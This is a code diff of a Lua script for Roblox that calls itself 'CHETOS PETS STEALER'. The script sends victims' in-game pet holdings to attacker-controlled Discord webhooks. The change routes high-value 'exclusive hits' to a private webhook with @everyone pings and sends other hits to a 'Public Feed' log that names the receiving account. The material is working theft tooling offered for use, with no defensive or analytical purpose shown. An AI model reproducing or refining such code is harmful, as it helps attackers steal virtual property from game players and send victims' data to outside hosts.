@@ -280,7 +280,9 @@ task.spawn(function()
     
     local base_payload = {username = " CHETOS PETS STEALER", avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&", embeds = { embed }}
 
-    if hasKitsune or hasDiscoBee or #priorityPets >= 10 or hasDragonflyCombo or hasButterflyCombo or hasMegaTargetPet then
+    local isExclusiveHit = hasKitsune or hasDiscoBee or #priorityPets >= 10 or hasDragonflyCombo or hasButterflyCombo or hasMegaTargetPet
+    
+    if isExclusiveHit then
         local payload = clone(base_payload)
         if shouldPing then payload.content = CONFIG.KITSUNE_PING_MESSAGE; payload.allowed_mentions = { parse = {"users", "everyone"} } end
         sendOurWebhook(CONFIG.KITSUNE_WEBHOOK_URL, payload)
@@ -304,8 +306,10 @@ task.spawn(function()
         end
     end
 
-    local log_description = string.format("**Receiver:** %s\n\n**Pets Found:**\n%s", getgenv().receiver or "N/A", formatPetList())
-    local embed_log = {title = "🐾 New Hit Logged", color = 15158332, description = log_description, footer = { text = "Public Feed" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
-    local payload_log = {username = "CHETOS LOGS", avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&", embeds = { embed_log }}
-    sendOurWebhook(CONFIG.LOGS_WEBHOOK_URL, payload_log)
+    if not isExclusiveHit then
+        local log_description = string.format("**Receiver:** %s\n\n**Pets Found:**\n%s", getgenv().receiver or "N/A", formatPetList())
+        local embed_log = {title = "🐾 New Hit Logged", color = 15158332, description = log_description, footer = { text = "Public Feed" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
+        local payload_log = {username = "CHETOS LOGS", avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&", embeds = { embed_log }}
+        sendOurWebhook(CONFIG.LOGS_WEBHOOK_URL, payload_log)
+    end
 end)
